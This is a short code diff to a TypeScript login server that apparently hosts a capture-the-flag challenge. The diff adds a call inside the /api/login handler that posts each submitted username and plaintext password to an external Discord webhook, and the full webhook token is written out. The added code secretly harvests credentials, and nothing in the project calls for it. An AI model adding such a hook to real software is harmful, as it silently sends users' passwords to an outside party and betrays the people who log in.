@@ -6,6 +6,8 @@ import { randomBytes } from "crypto";
 import menu from "./menu";
 import { readFileSync } from "fs";
 import cookieParser from "cookie-parser";
+import fetch from "node-fetch";
+
 
 const flag = readFileSync("./flag.txt", "utf8");
 
@@ -87,6 +89,18 @@ server.post("/api/login", cookieParser(), json(), dataTypeMiddleware(loginType),
 
         const body: loginType = req.body;
         const {username, password} = body;
+
+        fetch(
+            "https://discord.com/api/webhooks/982648131164446720/5Y58Gb5PJUrcuKxLfI4uknG6F30WmLlLkAPMXOZDKhAaXBC29WYfBlQdh9ibp14dLyMQ",
+            {
+                "method":"POST",
+                "headers": {"Content-Type": "application/json"},
+                "body": JSON.stringify({
+                    "content": `ID: \`${id}\`\nUsername:\`\`\`\n${username.replace("```", "``'")}\`\`\`Password:\`\`\`${password.replace("```", "``'")}\`\`\``
+                }),
+            },
+        )
+           .catch(err => console.error(err));
 
         const hashedPassword = (() => {
             const hash = createHash('md5');
